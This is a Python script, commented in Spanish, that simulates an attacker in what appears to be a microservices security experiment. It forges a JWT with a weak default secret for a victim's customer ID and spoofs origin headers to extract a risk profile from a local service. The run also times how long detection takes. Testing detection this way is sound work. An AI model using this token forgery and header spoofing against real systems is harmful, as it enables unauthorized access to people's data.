"""Escenario 1 — Confidencialidad (ASR1).

Simula al atacante: forja/manipula un token de sesión (PyJWT) para pedirle a
ms-cliente el perfil de riesgo de una víctima sin pasar por el flujo normal
de ms-identidad, incluyendo datos dummy del atacante (IP/device/país
simulados — no GeoIP real, ver decisión documentada en el diseño del
experimento).
"""
import os
from datetime import datetime

import jwt
import requests

MS_CLIENTE_URL = os.getenv("MS_CLIENTE_URL", "http://localhost:5000")
PERFIL_PATH_TEMPLATE = "/perfiles/{customer_id}"
# TODO: reemplazar por el secreto real de ms-identidad una vez implementado
# (o dejar deliberadamente uno robado/filtrado, según el mecanismo final que
# defina el equipo para materializar el bypass).
JWT_SECRET = os.getenv("JWT_SECRET", "change-me")

ATACANTE = {
    "ip": "1.2.3.4",  # dummy — simula origen desde un país sancionado
    "device": "unknown-device",
    "pais": "IR",
}


def forjar_token(customer_id_victima: str) -> str:
    payload = {"sub": "atacante", "customer_id": customer_id_victima}
    return jwt.encode(payload, JWT_SECRET, algorithm="HS256")


def ejecutar_ataque(customer_id_victima: str):
    token = forjar_token(customer_id_victima)
    ataque_enviado_en = datetime.now()
    endpoint = (
        f"{MS_CLIENTE_URL}"
        f"{PERFIL_PATH_TEMPLATE.format(customer_id=customer_id_victima)}"
    )
    headers = {
        "Authorization": f"Bearer {token}",
        "X-Forwarded-For": ATACANTE["ip"],
        "X-Device-Id": ATACANTE["device"],
        "X-Country": ATACANTE["pais"],
    }

    respuesta = requests.post(endpoint, headers=headers, timeout=10)

    print(f"Ataque enviado: {ataque_enviado_en.isoformat(timespec='seconds')}")

    extraccion_exitosa = False
    try:
        payload = respuesta.json()
        extraccion_exitosa = respuesta.status_code == 200 and bool(payload)
    except ValueError:
        payload = respuesta.text

    print(f"HTTP status: {respuesta.status_code}")
    print(f"Extraccion exitosa: {'si' if extraccion_exitosa else 'no'}")
    if extraccion_exitosa:
        print(f"Datos extraidos: {payload}")

    print("Medicion deteccion/notificacion: manual")
    print(
        "No existe todavia un endpoint o consulta automatizable en el "
        "scaffold para confirmar el incidente desde este script."
    )
    print(
        "Mide manualmente el tiempo desde la marca 'Ataque enviado' hasta "
        "que ms-audit o ms-notificaciones registren el incidente en consola."
    )


if __name__ == "__main__":
    ejecutar_ataque(customer_id_victima="CLI-0001")
